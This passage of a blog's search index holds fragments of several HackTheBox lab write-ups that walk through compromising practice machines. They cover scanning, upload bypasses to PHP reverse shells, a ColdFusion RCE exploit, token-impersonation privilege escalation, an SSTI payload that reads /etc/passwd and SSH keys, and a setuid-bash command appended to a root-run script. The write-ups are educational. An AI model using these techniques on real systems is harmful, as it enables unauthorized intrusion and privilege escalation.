credentials that I found earlier and I’m in as a notch. ssh as notch ","date":"22-10-2022","objectID":"/posts/htb/blocky/:2:0","tags":["gobuster","wordpress","jd-gui","jar-file"],"title":"HackTheBox - Blocky Writeup","uri":"/posts/htb/blocky/"},{"categories":["HacktheBox"],"content":"Root Then, I’ll try to enumerate the sudo permissions by running this command sudo -l. Surprisingly, this user has all access to everything and I ended up just running the command sudo su to get the root shell. change user to root NICE! ","date":"22-10-2022","objectID":"/posts/htb/blocky/:3:0","tags":["gobuster","wordpress","jd-gui","jar-file"],"title":"HackTheBox - Blocky Writeup","uri":"/posts/htb/blocky/"},{"categories":["HacktheBox"],"content":"Nmap Like always, I’m going to scan the IP address by using nmap but I’m going to scan the full port first. Then, I’m going to scan the only open ports. nmap -p- --min-rate=10000 10.10.10.29 nmap -p22,53,80 -sCV -oN nmap/bank 10.10.10.29 22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 08eed030d545e459db4d54a8dc5cef15 (DSA) | 2048 b8e015482d0df0f17333b78164084a91 (RSA) | 256 a04c94d17b6ea8fd07fe11eb88d51665 (ECDSA) |_ 256 2d794430c8bb5e8f07cf5b72efa16d67 (ED25519) 53/tcp open domain ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.9.5-3ubuntu0.14-Ubuntu 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) |_http-title: Apache2 Ubuntu Default Page: It works |_http-server-header: Apache/2.4.7 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel The nmap scan result is completed. Looks like, this machine has a web server running on Apache and this is an Ubuntu machine. Also, port 53 is open and the scan results did not reveal any information about the domain/hostname. So, I’m going to add bank.htb into my /etc/hosts file just in case. adding bank hostname ","date":"15-10-2022","objectID":"/posts/htb/bank/:1:0","tags":["upload-vuln","gobuster","php-reverse-shell","SUID"],"title":"HackTheBox - Bank Writeup","uri":"/posts/htb/bank/"},{"categories":["HacktheBox"],"content":"Http: bank.htb I already add the IP address into the /etc/hosts file but I’m eager to check the IP address in the URL. When I checked, I’m greeted by the apache default installation page. However, when I navigate to the bank.htb I’ve been greeted with the login page. That’s interesting because nmap did not find any results about it. bank.htb login page ","date":"15-10-2022","objectID":"/posts/htb/bank/:1:1","tags":["upload-vuln","gobuster","php-reverse-shell","SUID"],"title":"HackTheBox - Bank Writeup","uri":"/posts/htb/bank/"},{"categories":["HacktheBox"],"content":"Gobuster Since this is a php webserver, I’m going to run gobuster with the -x flag for looking up only .php extensions. To be honest, this part is making me lose my mind because the directories that I found are not interesting at all. So, I’m going to the login page again and tried sql injection and nothing comeback. Turns out, some are not in raft wordlists, and that wordlist is the one that I love the most using it. However, when I used the directory-list-2.3-medium.txt wordlist, something interesting popped up. gobuster ","date":"15-10-2022","objectID":"/posts/htb/bank/:1:2","tags":["upload-vuln","gobuster","php-reverse-shell","SUID"],"title":"HackTheBox - Bank Writeup","uri":"/posts/htb/bank/"},{"categories":["HacktheBox"],"content":"Http: /balance-transfer That directory is called /balance-transfer and it has a bunch of files with .acc extensions on it. Since this is a bank machine and it has a bank login page. So, I assumed this is the user account file. When I clicked on one of the files, it automatically download it. balance transfer Upon expecting the file, I’m right. It contains user account information such as name, email, password, and balance with all the private info encrypted. I’ll try to crack it but unfortunately, it can’t be cracked. Hmmm read encypt success Then, I navigate back to the /balance-transfer directory and click the Size filter on top, and found the only file that has an insignificant less size than the others. However, I want to be “leet” today by sorting those files size out by using a terminal. Why not ;) run the leet command The first command, will count the size of the file and sorting out by unique count. Then, I’m trying to grep the file name by that size 257 and I’m making the curl request to the file and got the user information to expose because this file seems it’s failed to be encrypted. ","date":"15-10-2022","objectID":"/posts/htb/bank/:1:3","tags":["upload-vuln","gobuster","php-reverse-shell","SUID"],"title":"HackTheBox - Bank Writeup","uri":"/posts/htb/bank/"},{"categories":["HacktheBox"],"content":"Foothold: upload Now, I have the credentials that I needed. So, I’m going ahead to the login page, and voila. Success! page after login Looks like, just a simple bank account page, by clicking on Support on the left navigation bar. I’ve been greeted by a support ticket page where I can upload a file to it. Since this is a php website I’ll try uploading the reverse shell and it’s shouting at me says “image file only”. support page So, I fire up burpsuite and tried a bunch of extensions and hoping that I can bypass it but unfortunately all failed. However, when I looked at the request I found these interesting comments. It’s says “to execute php file, must use .htb extension”. Without time wasted, I’m uploading the php reverse shell with the .htb extension. extensions comments ","date":"15-10-2022","objectID":"/posts/htb/bank/:2:0","tags":["upload-vuln","gobuster","php-reverse-shell","SUID"],"title":"HackTheBox - Bank Writeup","uri":"/posts/htb/bank/"},{"categories":["HacktheBox"],"content":"PrivEsc: SUID Nice! I’m in as a www-data user and the best thing to do is upgrade my shell. Then, I’ll try to enumerate the sudo permissions by running this command sudo -l. However, it required the password for this user that I did not have it. shell as www-data So, I end up checking the SUID binaries and found an interesting file called emergency that is located at /var/htb/bin which is not native to linux system files and directories. find suid ","date":"15-10-2022","objectID":"/posts/htb/bank/:3:0","tags":["upload-vuln","gobuster","php-reverse-shell","SUID"],"title":"HackTheBox - Bank Writeup","uri":"/posts/htb/bank/"},{"categories":["HacktheBox"],"content":"Root I’m excited to run it and hope it gets me the root shell. Without further ado, I executed it, and BOOM! shell as root I’m root. ","date":"15-10-2022","objectID":"/posts/htb/bank/:4:0","tags":["upload-vuln","gobuster","php-reverse-shell","SUID"],"title":"HackTheBox - Bank Writeup","uri":"/posts/htb/bank/"},{"categories":["HacktheBox"],"content":"Nmap Like always, I’m going to scan the IP address by using Nmap but I’m going to scan the full port first. Then, I’m going to scan the only open ports. nmap -p135,8500,49154 -sCV -oN nmap/arctic 10.10.10.11 135/tcp open msrpc Microsoft Windows RPC 8500/tcp open fmtp? 49154/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows The nmap scan result is completed. Based on the services, look like this is a Windows target and three ports that open. Port 135/49154 msrpc and 8500 fmtp. To be honest, I’ll try to enumerate all of those open ports and I cannot find anything useful at all. First, I’ll try playing around with msrpc and try using impacket to dump endpoints but again nothing useful came out of it and fmtp does not have a lot of information about it as far as I search (maybe not that far I guess). It was just a train wreck for me. So, I end up navigating those ports on my browser and I found something useful *SMILE*. ","date":"08-10-2022","objectID":"/posts/htb/arctic/:1:0","tags":["CVE-2009-2265","juicy-potato","seImpersonatePrivilege","coldfusion","rce","smbserver.py","upload-vuln","lfi","jsp-reverse-shell","msfvenom"],"title":"HackTheBox - Arctic Writeup","uri":"/posts/htb/arctic/"},{"categories":["HacktheBox"],"content":"Webserver: 8500 Turns out, this machine has a web server that lists directories on port 8500 and one of the directories called CFIDE. Then, I googled it and found out, it is related to Adobe software called Coldfusion and my prediction is correct when I navigate to /CFIDE/administrator/. coldfusion login page On the login page, I can’t change the username but the password input field is something else. When I’ll try to put something in the password field, then I click on login. Suddenly, it changes the string into something else. ","date":"08-10-2022","objectID":"/posts/htb/arctic/:2:0","tags":["CVE-2009-2265","juicy-potato","seImpersonatePrivilege","coldfusion","rce","smbserver.py","upload-vuln","lfi","jsp-reverse-shell","msfvenom"],"title":"HackTheBox - Arctic Writeup","uri":"/posts/htb/arctic/"},{"categories":["HacktheBox"],"content":"Foothold: RCE Well, I don’t want to waste any time looking deeper into the login page (plz don’t be like me). On the login page itself, it displays the version. Then, I’ll try to search for the exploit on searchsploit. coldfusion 8 rce Shockingly, there’s an RCE exploit and it did not disappoint me at all. So, I’m copying that exploit into my current directory with -m and the exploit id. When I expect the exploit, it says this version of Coldfusion has a CVE assigned to it called CVE-2009-2265 and vulnerabilities can be found in FCKeditor before 2.6.4.1 that allows remote attackers to create executable files. So, this exploits that I have right now, it’s going to create a payload through msfvenom and upload it, and also started the nc listener. Well, I need to change the listening host and port inside of it and I’m good to go. However, I love to add rlwrap in the listen_connection function since this is a Windows machine. shell as tolis ","date":"08-10-2022","objectID":"/posts/htb/arctic/:3:0","tags":["CVE-2009-2265","juicy-potato","seImpersonatePrivilege","coldfusion","rce","smbserver.py","upload-vuln","lfi","jsp-reverse-shell","msfvenom"],"title":"HackTheBox - Arctic Writeup","uri":"/posts/htb/arctic/"},{"categories":["HacktheBox"],"content":"PrivEsc: SeImpersonatePrivilege Nice! I’m in as tolis. The first thing, I love to do is run the whoami /priv command and the result is shocking to me. Turns out, the SeImpersonatePrivilege token is enabled and I can use the “impersonation method” like the previous machine. So, I run the systeminfo command to know the version of Windows I’m currently in and the result is Windows Server 2008 R2. check the system and priv Since this is an old version of Windows. I’m going to use JuicyPotato exploit to gain system but first, I need to transfer it into the target machine by firing off the impacket-smbserver like the previous machine that I work on. After it’s done transferring the exploit I also transfer the nc.exe executables. Since I’m on a Kali machine this executable can be found on /usr/share/windows-binaries/. transferring file ","date":"08-10-2022","objectID":"/posts/htb/arctic/:4:0","tags":["CVE-2009-2265","juicy-potato","seImpersonatePrivilege","coldfusion","rce","smbserver.py","upload-vuln","lfi","jsp-reverse-shell","msfvenom"],"title":"HackTheBox - Arctic Writeup","uri":"/posts/htb/arctic/"},{"categories":["HacktheBox"],"content":"System I’ve already transferred the file that is needed before I executed it. I need to grab one of the CLSID to make it work since the default one did not work. So, this target machine is a Windows Server 2008 R2 Standard but I’m going to use the R2 Enterprise version of it. *hope it works* shell as system Awesome! ","date":"08-10-2022","objectID":"/posts/htb/arctic/:5:0","tags":["CVE-2009-2265","juicy-potato","seImpersonatePrivilege","coldfusion","rce","smbserver.py","upload-vuln","lfi","jsp-reverse-shell","msfvenom"],"title":"HackTheBox - Arctic Writeup","uri":"/posts/htb/arctic/"},{"categories":["HacktheBox"],"content":"Nmap Like always, I’m going to scan the IP address by using Nmap. However, today I feel spicier ;). So, I’m going to scan the full port with -p- then I’m only scanning those open ports with scripts and version enumeration. nmap -sCV -p22,80 -oN nmap/nibbles 10.10.10.75 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA) | 256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA) |_ 256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Site doesn't have a title (text/html). |_http-server-header: Apache/2.4.18 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel The nmap scan is completed and looks like I’m only dealing with port 22 and 80. The banner itself says this machine is a linux box and running ubuntu. ","date":"03-10-2022","objectID":"/posts/htb/nibbles/:1:0","tags":["CVE-2015-6967","nibbleblog","php-reverse-shell","gobuster","upload-vuln"],"title":"HackTheBox - Nibbles Writeup","uri":"/posts/htb/nibbles/"},{"categories":["HacktheBox"],"content":"Http With that information, I’m going straight to my browser and navigating to the IP address, and surprisingly it only displays Hello world! with bold text. Upon expecting the source of the page it’s leaking the directory called /nibbleblog/. view page source ","date":"03-10-2022","objectID":"/posts/htb/nibbles/:2:0","tags":["CVE-2015-6967","nibbleblog","php-reverse-shell","gobuster","upload-vuln"],"title":"HackTheBox - Nibbles Writeup","uri":"/posts/htb/nibbles/"},{"categories":["HacktheBox"],"content":"Http: /nibbleblog By navigating through that directory. I’ve been greeted with some sort of blog page title Nibbles - Yum yum. Then, I started guessing the index file with different extensions and I got a hit with PHP extensions. Turns out, this is a PHP website. So, I started to look around in that blog and cannot find anything useful. nibbles yum yum ","date":"03-10-2022","objectID":"/posts/htb/nibbles/:2:1","tags":["CVE-2015-6967","nibbleblog","php-reverse-shell","gobuster","upload-vuln"],"title":"HackTheBox - Nibbles Writeup","uri":"/posts/htb/nibbles/"},{"categories":["HacktheBox"],"content":"Gobuster Now, I’m going to fire off my guns (jk). Gobuster to enumerate further and look for any hidden directories and files. Sure enough, it’s managed to find the login page located /admin.php but I did not have any credentials on me right now. Also, the /admin directory caught my eye but again I cannot find anything useful. gobuster ","date":"03-10-2022","objectID":"/posts/htb/nibbles/:2:2","tags":["CVE-2015-6967","nibbleblog","php-reverse-shell","gobuster","upload-vuln"],"title":"HackTheBox - Nibbles Writeup","uri":"/posts/htb/nibbles/"},{"categories":["HacktheBox"],"content":"Http: /nibbleblog/content/ The /content directory also attracts my intentions by having such a unique name :). Upon enumerating the content of it. Finally, I manage to find something useful this time and it was a username located in /nibbleblog/content/private/users.xml. Now, I have equipped with the username but I did not manage to find any password at all. found the username ","date":"03-10-2022","objectID":"/posts/htb/nibbles/:2:3","tags":["CVE-2015-6967","nibbleblog","php-reverse-shell","gobuster","upload-vuln"],"title":"HackTheBox - Nibbles Writeup","uri":"/posts/htb/nibbles/"},{"categories":["HacktheBox"],"content":"Http: /admin.php Only with the username in my hands, I’m heading to the login page by navigating through /nibbleblog/admin.php and start guessing the password. Suppringsly, I manage to get it correctly and the password is nibbles. Yeah, the name of the box itself. nibbleblog dashboard By clicking the Settings on the left sidebar and scrolling at the bottom. Its displays the version of it. nibbleblog version ","date":"03-10-2022","objectID":"/posts/htb/nibbles/:2:4","tags":["CVE-2015-6967","nibbleblog","php-reverse-shell","gobuster","upload-vuln"],"title":"HackTheBox - Nibbles Writeup","uri":"/posts/htb/nibbles/"},{"categories":["HacktheBox"],"content":"Foothold Without further ado, I’m asking my old friend Mr.Google regarding this version. Turns out, this particular version has an assigned CVE to it called CVE-2015-6967 it’s vulnerable to Unrestricted file upload in the My Image plugin. So, I’m ready to upload the php reverse shell but first, I need to navigate through Plugins -\u003e My Image -\u003e Configure. Then, upload the shell (just ignore the warning), and to execute it, I must click the shell that is located in /nibbleblog/content/private/plugins/my_image/. shell as nibbler ","date":"03-10-2022","objectID":"/posts/htb/nibbles/:3:0","tags":["CVE-2015-6967","nibbleblog","php-reverse-shell","gobuster","upload-vuln"],"title":"HackTheBox - Nibbles Writeup","uri":"/posts/htb/nibbles/"},{"categories":["HacktheBox"],"content":"PrivEsc: monitor.sh Viola! I’m in as a nibbler user and the best thing to do is upgrade my shells with python3. My favorite thing to do after getting a shell is checking the user sudo permission with the command sudo -l. *Jaw dropped*, apparently I can run the monitor.sh file as sudo without any password needed. Awesome! check sudo permission However, when I’m in nibbler’s home directory. I cannot find the monitor.sh file but I find a zip archive file called personal.zip. So, I unzip that archive, and hold and behold there is the monitor.sh file. Upon expecting the script of it, I did not find it amusing. However, the file itself has an interesting character that I can write into the file. ","date":"03-10-2022","objectID":"/posts/htb/nibbles/:4:0","tags":["CVE-2015-6967","nibbleblog","php-reverse-shell","gobuster","upload-vuln"],"title":"HackTheBox - Nibbles Writeup","uri":"/posts/htb/nibbles/"},{"categories":["HacktheBox"],"content":"Root So, I’d end up putting one line command when executed it. It will make a /bin/bash as a setuid binary. Then, I’m typing this command /bin/bash -p and it will drop me into the root shell. echo \"chmod +s /bin/bash\" \u003e\u003e monitor.sh become root ","date":"03-10-2022","objectID":"/posts/htb/nibbles/:5:0","tags":["CVE-2015-6967","nibbleblog","php-reverse-shell","gobuster","upload-vuln"],"title":"HackTheBox - Nibbles Writeup","uri":"/posts/htb/nibbles/"},{"categories":["HacktheBox"],"content":"Nmap Like always, I’m going to scan the IP Address by using Nmap. # Nmap 7.92 scan initiated Fri Aug 5 21:51:15 2022 as: nmap -sCV -oN nmap/grandpa 10.10.10.14 Nmap scan report for 10.10.10.14 Host is up (0.66s latency). Not shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 6.0 |_http-title: Under Construction | http-methods: |_ Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH | http-webdav-scan: | Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK | Server Type: Microsoft-IIS/6.0 | Server Date: Fri, 05 Aug 2022 13:52:20 GMT | Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH |_ WebDAV type: Unknown |_http-server-header: Microsoft-IIS/6.0 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Aug 5 21:52:34 2022 -- 1 IP address (1 host up) scanned in 79.44 seconds That’s interesting! only 1 port is open. Port 80 ","date":"19-08-2022","objectID":"/posts/htb/grandpa/:1:0","tags":["smbserver.py","seImpersonatePrivilege","microsoft-iis-6.0","iis6-reverse-shell","churrasco"],"title":"HackTheBox - Grandpa Writeup","uri":"/posts/htb/grandpa/"},{"categories":["HacktheBox"],"content":"Http: Microsoft IIS 6.0 It looks like I’m dealing with a Windows machine that’s running Microsoft IIS version 6.0 on port 80. To be honest, it sounds kind of an old version. So, I did some googling and found out, It is an old version of Microsoft IIS. release date of microsoft iis 6.0 Well, here (image above) is tied to one particular Windows Server version. Without wasting any time, I start googling some exploits that might be useful to me. ","date":"19-08-2022","objectID":"/posts/htb/grandpa/:1:1","tags":["smbserver.py","seImpersonatePrivilege","microsoft-iis-6.0","iis6-reverse-shell","churrasco"],"title":"HackTheBox - Grandpa Writeup","uri":"/posts/htb/grandpa/"},{"categories":["HacktheBox"],"content":"Foothold: iis6 reverse shell It took me no time at all to find this Github repos with reverse shell for this particular version of Microsoft IIS. Then, I downloaded the exploit. It looks like a python2 script. So, I’d change the file name with the .py extension at the end. Also, to be able to execute it. I must provide victim/attacker IP \u0026 victim/attacker PORT. shell as nt authority\\network service ","date":"19-08-2022","objectID":"/posts/htb/grandpa/:2:0","tags":["smbserver.py","seImpersonatePrivilege","microsoft-iis-6.0","iis6-reverse-shell","churrasco"],"title":"HackTheBox - Grandpa Writeup","uri":"/posts/htb/grandpa/"},{"categories":["HacktheBox"],"content":"Windows: SeImpersonatePrivilege I’m in as nt authority\\network service user. However, I want to be nt authority\\system :(. The first thing, I love to do is to check the privilege this (current) user have. This can be accomplished by running this command whoami /priv. SeImpersonatePrivilege token enabled check OS and version I’m not expecting that at all. It says SeImpersonatePrivilege is enabled. This can lead to token kidnapping/impersonate attacks and elevate my privilege into nt authority\\system. Like always, I start googling these specific attacks on Microsoft Windows Server 2003 and I manage to find this exploit through this article on Medium. ","date":"19-08-2022","objectID":"/posts/htb/grandpa/:2:1","tags":["smbserver.py","seImpersonatePrivilege","microsoft-iis-6.0","iis6-reverse-shell","churrasco"],"title":"HackTheBox - Grandpa Writeup","uri":"/posts/htb/grandpa/"},{"categories":["HacktheBox"],"content":"SMBserver.py To elevate my privilege, it must require nc.exe and churrasco.exe (exploit) on the victim machine. Well, I’ll try running the Powershell on the victim but nothing happens. Lucky for me, I found this article on “how to transfer files with smbserver.py”. So, I started the SMB server with impacket's smbserver.py and transferred those files into the victim machine. transfer exploit and nc.exe ","date":"19-08-2022","objectID":"/posts/htb/grandpa/:2:2","tags":["smbserver.py","seImpersonatePrivilege","microsoft-iis-6.0","iis6-reverse-shell","churrasco"],"title":"HackTheBox - Grandpa Writeup","uri":"/posts/htb/grandpa/"},{"categories":["HacktheBox"],"content":"Windows: Privilege Escalation I’ve already transferred the file that is needed. So, I’m going to execute the exploit with nc.exe to establish the connection and also set up the listeners to catch the shell. shell as nt authority\\system ","date":"19-08-2022","objectID":"/posts/htb/grandpa/:3:0","tags":["smbserver.py","seImpersonatePrivilege","microsoft-iis-6.0","iis6-reverse-shell","churrasco"],"title":"HackTheBox - Grandpa Writeup","uri":"/posts/htb/grandpa/"},{"categories":["HacktheBox"],"content":"Nmap Like always, I’m going to scan the IP Address by using Nmap. # Nmap 7.92 scan initiated Tue May 17 23:03:20 2022 as: nmap -sC -sV -vv -p- -oN nmap/late_all 10.10.11.156 Nmap scan report for 10.10.11.156 Host is up, received echo-reply ttl 63 (0.070s latency). Scanned at 2022-05-17 23:03:21 +08 for 243s Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDSqIcUZeMzG+QAl/4uYzsU98davIPkVzDmzTPOmMONUsYleBjGVwAyLHsZHhgsJqM9lmxXkb8hT4ZTTa1azg4JsLwX1xKa8m+RnXwJ1DibEMNAO0vzaEBMsOOhFRwm5IcoDR0gOONsYYfz18pafMpaocitjw8mURa+YeY21EpF6cKSOCjkVWa6yB+GT8mOcTZOZStRXYosrOqz5w7hG+20RY8OYwBXJ2Ags6HJz3sqsyT80FMoHeGAUmu+LUJnyrW5foozKgxXhyOPszMvqosbrcrsG3ic3yhjSYKWCJO/Oxc76WUdUAlcGxbtD9U5jL+LY2ZCOPva1+/kznK8FhQN | 256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBMen7Mjv8J63UQbISZ3Yju+a8dgXFwVLgKeTxgRc7W+k33OZaOqWBctKs8hIbaOehzMRsU7ugP6zIvYb25Kylw= | 256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIGrWbMoMH87K09rDrkUvPUJ/ZpNAwHiUB66a/FKHWrj 80/tcp open http syn-ack ttl 63 nginx 1.14.0 (Ubuntu) |_http-title: Late - Best online image tools |_http-favicon: Unknown favicon MD5: 1575FDF0E164C3DB0739CF05D9315BDF | http-methods: |_ Supported Methods: GET HEAD |_http-server-header: nginx/1.14.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue May 17 23:07:24 2022 -- 1 IP address (1 host up) scanned in 243.26 seconds There are only 2 ports open. The 22/SSH and 80/HTTP ports. ","date":"30-07-2022","objectID":"/posts/htb/late/:1:0","tags":["linpeas","ssti","pspy"],"title":"HackTheBox - Late Writeup","uri":"/posts/htb/late/"},{"categories":["HacktheBox"],"content":"Http: late.htb Well, the SSH is open. However, I’m going to ignore it because that’s almost not likely going to be vulnerable. So, I’m going to check the other port, which is port 80 by navigating through my browser. That’s unexpected, I found a subdomain called images and also the hostname late.htb. I’m going to add it to my /etc/hosts file. found the hostname add hostname in /etc/hosts ","date":"30-07-2022","objectID":"/posts/htb/late/:1:1","tags":["linpeas","ssti","pspy"],"title":"HackTheBox - Late Writeup","uri":"/posts/htb/late/"},{"categories":["HacktheBox"],"content":"Http: images.late.htb Going to the images.late.htb it says convert image to text with flask. Well, I’m using kali linux and its came with mousepad as text editor (XFCE flavour). So, I’m going to open the text editor and type the Hello,World as the text and screenshot it with Flameshot. Save it and upload the file. convert image webpage After I uploaded it, my browser downloaded the file called result.txt. When I read the content of the file it says Hello,World like the image that I uploaded but it’s wrapped in an HTML paragraph tag. output result ","date":"30-07-2022","objectID":"/posts/htb/late/:1:2","tags":["linpeas","ssti","pspy"],"title":"HackTheBox - Late Writeup","uri":"/posts/htb/late/"},{"categories":["HacktheBox"],"content":"SSTI (Server Side Template Injection) That’s interesting. So, like any human being that I am. I asked for help from Mr.Google itself (ask nicely of course;p). I’ve got bombarded with the result always something to do with SSTI. Well, to be fair! this is a flask application that’s using jinja as the template engine. It does make sense if this app is vulnerable to it. Time to find out! first, I’m going to upload an image with this payload as text {{7*7}}. In theory, the template engine will see this as a mathematical equation and try to solve it. Hold and behold, the result is 49 and this is a positive indication it is vulnerable. So, I’ll try uploading the read file payload. In this case, it is /etc/passwd file. It successfully retrieves the file. Tip I’m using Roboto Slab Regular fonts in Mousepad SSTI payload read file output result /etc/passwd ","date":"30-07-2022","objectID":"/posts/htb/late/:1:3","tags":["linpeas","ssti","pspy"],"title":"HackTheBox - Late Writeup","uri":"/posts/htb/late/"},{"categories":["HacktheBox"],"content":"SSH: svc_acc From the result above, there are just two users in this box. The root and svc_acc user. Also, the nmap scan result above shows port 22 is open. Which is SSH. Then, I’ll try to retrieve the svc_acc ssh private key in the user’s home directory in the .ssh check user on the box I’ll change the payload from read /etc/passwd file into /home/svc_acc/.ssh/id_rsa. Well, the result came back and it did not disappoint at all. So, I’m going to open the file and remove the HTML paragraph tag \u003cp\u003e\u003c/p\u003e, and save it into a new name called svc_acc. Also, change the permission with this command; chmod 600 \u003cid_rsa\u003e. Without further ado, I’m going to ssh into the box with this key. (please work *finger cross*). It did work! YES! read svc_acc SSH file ssh as svc_acc ","date":"30-07-2022","objectID":"/posts/htb/late/:2:0","tags":["linpeas","ssti","pspy"],"title":"HackTheBox - Late Writeup","uri":"/posts/htb/late/"},{"categories":["HacktheBox"],"content":"PEASS-ng: linpeas.sh I’m in as a svc_acc user and I also can read the first flag, which is the user flag. To be honest, I just want a quick win. Since this is a linux box, I’m going to run the linpeas script in this box. As always, I’m going to run the latest version of linpeas from carlospolop. After it is all done running, I’ll check the output and find something weird. A directory called /usr/local/sbin contain a file called ssh-alert.sh. The file itself looks like a bash script because it’s ended up with .sh extensions and this file is not a native to the linux ecosystem. (I think?) linpeas output ","date":"30-07-2022","objectID":"/posts/htb/late/:2:1","tags":["linpeas","ssti","pspy"],"title":"HackTheBox - Late Writeup","uri":"/posts/htb/late/"},{"categories":["HacktheBox"],"content":"/usr/local/sbin: ssh-alert.sh Upon inspecting the file, it’s looks like this file probably running every time someone logs in. Well, I’ll try to edit the file but permissions don’t allow me to write it when I checked the file attribute. Turns out, I can append something to this file. However, if I manage to change this file. It doesn’t mean I’m going to be root because this file belongs to the svc_acc user \u0026 groups. Honestly, I’m stuck and don’t know what to do next. So, I reached out to the HackTheBOX community and got a nudge on pspy. I’m super excited because I’ve never used this tool before let alone known it exists. contents in ssh-alert.sh file ","date":"30-07-2022","objectID":"/posts/htb/late/:2:2","tags":["linpeas","ssti","pspy"],"title":"HackTheBox - Late Writeup","uri":"/posts/htb/late/"},{"categories":["HacktheBox"],"content":"Pspy Pspy is a command-line tool designed to snoop on processes without the need for root permissions. It allows seeing commands run by other users, cron jobs, etc. as they execute. Without wasting any single second, I’m going to download the pspy64 on the release page and execute it. execute pspy Based on the file ssh-alert.sh above. I need to make an ssh connection, to be able to execute the file. So, I’m going to open a new terminal and ssh in the box again. Interestingly, something pops out in the pspy output. The output itself shows the ssh-alert.sh file be executed by root and I can gain the reverse shell in this way. NOTE: UID=0 is root root execute ssh-alert.sh file ","date":"30-07-2022","objectID":"/posts/htb/late/:2:3","tags":["linpeas","ssti","pspy"],"title":"HackTheBox - Late Writeup","uri":"/posts/htb/late/"},{"categories":["HacktheBox"],"content":"Linux: Privilege Escalation Going back to the /usr/local/sbin directory, I’m going to append the bash reverse shell into the ssh-alert.sh file. As mentioned above, I’m going to make a connection once again, and BOOM!. I’ve got the root shell. append bash reverse shell shell as root ","date":"30-07-2022","objectID":"/posts/htb/late/:3:0","tags":["linpeas","ssti","pspy"],"title":"HackTheBox - Late Writeup","uri":"/posts/htb/late/"},{"categories":["HacktheBox"],"content":"Nmap Let’s scan the IP Address first by using Nmap. # Nmap 7.92 scan initiated Wed Feb 9 07:45:26 2022 as: nmap -sC -sV -oN nmap/paper 10.129.156.206 Nmap scan report for 10.129.156.206 Host is up (0.23s latency). Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.0 (protocol 2.0) | ssh-hostkey: | 2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA) | 256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA) |_ 256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519) 80/tcp open http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9) |_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28 | http-methods: |_ Potentially risky methods: TRACE |_http-title: HTTP Server Test Page powered by CentOS |_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9 443/tcp open ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9) |_ssl-date: TLS randomness does not represent time | http-methods: |_ Potentially risky methods: TRACE |_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28 |_http-title: HTTP Server Test Page powered by CentOS | ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US | Subject Alternative Name: DNS:localhost.localdomain | Not valid before: 2021-07-03T08:52:34 |_Not valid after: 2022-07-08T10:32:34 |_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9 | tls-alpn: |_ http/1.1 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Feb 9 07:45:54 2022 -- 1 IP address (1 host up) scanned in 27.74 seconds Only 3 open ports ","date":"19-06-2022","objectID":"/posts/htb/paper/:1:0","tags":["CVE-2019-17671","CVE-2021-3560","polkit","linpeas","gobuster","wordpress","hubot"],"title":"HackTheBox - Paper Writeup","uri":"/posts/htb/paper/"},{"categories":["HacktheBox"],"content":"Http/HttpS From the Nmap scan result above, the port 80,443 is open. So, like a normal human being. I’m navigating through it using a web browser :) apache default page in centOS Well, that’s not what I expected. It shows the default page after installation in CentOS. 